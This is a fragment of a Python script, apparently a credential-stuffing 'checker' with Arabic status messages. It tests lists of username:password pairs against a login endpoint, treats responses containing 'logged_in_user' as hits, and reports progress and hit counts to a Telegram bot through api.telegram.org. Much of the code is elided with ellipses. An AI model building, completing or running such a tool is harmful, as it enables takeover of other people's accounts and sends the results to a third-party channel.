...
tele = input("  "+BYellow+"- Send Your Token :  ")
os.system('clear')
print(BWhite+"""
███████████████████████████
███████▀▀▀░░░░░░░▀▀▀███████
...
while True:
    ...
    if 'logged_in_user' in req_login.text:
        ...
        requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= جـــــاري ....... الفحص\n\n MARV \n✔️\n√ @OO2XRT |√\
  \n شــغـــال 🌹»[{zz}]\n-\u300aمـــبـــنــد 🥀 [{aa}]")
    else:
        print("  "+BRed+f"  ⌯  مــبـــنــد--> "+BWhite+" :"+BRed+f" {user}:{pasw} ")